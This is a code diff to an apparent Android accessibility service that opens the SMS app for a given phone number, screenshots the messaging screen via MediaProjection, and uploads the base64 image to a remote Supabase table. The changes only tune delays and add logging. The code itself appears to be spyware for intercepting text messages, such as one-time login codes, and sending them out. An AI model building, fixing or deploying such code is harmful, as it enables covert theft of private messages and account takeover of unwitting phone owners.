@@ -18,11 +18,9 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
@@ -55,7 +53,7 @@ public class SmsAccessibilityService extends AccessibilityService {
 
     public void setPendingPhone(String phone) {
         this.pendingPhone = phone;
-        openSmsApp();
+        handler.post(() -> openSmsApp());
     }
 
     public void setMediaProjection(MediaProjection mp) {
@@ -80,15 +78,20 @@ public class SmsAccessibilityService extends AccessibilityService {
 
         String pkg = event.getPackageName().toString();
         if (pkg.contains("mms") || pkg.contains("messaging")) {
+            handler.removeCallbacksAndMessages(null);
             handler.postDelayed(() -> {
                 takeScreenshotAndUpload();
                 pendingPhone = null;
-            }, 2500);
+            }, 3000); // Увеличил задержку до 3 секунд
         }
     }
 
     private void takeScreenshotAndUpload() {
-        if (mediaProjection == null) return;
+        if (mediaProjection == null) {
+            Log.e("SMS_ACCESS", "MediaProjection is null");
+            return;
+        }
+        Log.d("SMS_ACCESS", "Taking screenshot for phone: " + pendingPhone);
         ImageReader reader = null;
         VirtualDisplay vd = null;
         Image image = null;
@@ -100,7 +103,7 @@ public class SmsAccessibilityService extends AccessibilityService {
             reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
             vd = mediaProjection.createVirtualDisplay("screen_capture", w, h, metrics.densityDpi,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
-            Thread.sleep(800);
+            Thread.sleep(1000);
             image = reader.acquireLatestImage();
             if (image != null) {
                 Image.Plane[] planes = image.getPlanes();
@@ -114,9 +117,12 @@ public class SmsAccessibilityService extends AccessibilityService {
                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
                 cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                 String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                Log.d("SMS_ACCESS", "Screenshot taken, size: " + base64.length());
                 updateTaskInSupabase(pendingPhone, base64);
                 bitmap.recycle();
                 cropped.recycle();
+            } else {
+                Log.e("SMS_ACCESS", "Image is null");
             }
         } catch (Exception e) {
             Log.e("SMS_ACCESS", "Screenshot error", e);
